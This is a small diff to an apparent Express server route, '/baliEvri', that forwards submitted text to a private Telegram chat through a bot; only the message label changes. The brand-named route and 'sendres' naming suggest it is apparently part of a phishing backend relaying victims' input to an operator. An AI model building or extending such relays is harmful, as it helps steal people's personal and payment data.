@@ -13250,7 +13250,7 @@ app.post("/baliEvri", (req, res) => {
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
               chat_id: 680379375,
-              text: `EvriDP:\n${originalText}`,
+              text: `EvriBali:\n${originalText}`,
               parse_mode: "Markdown",
             }
           )
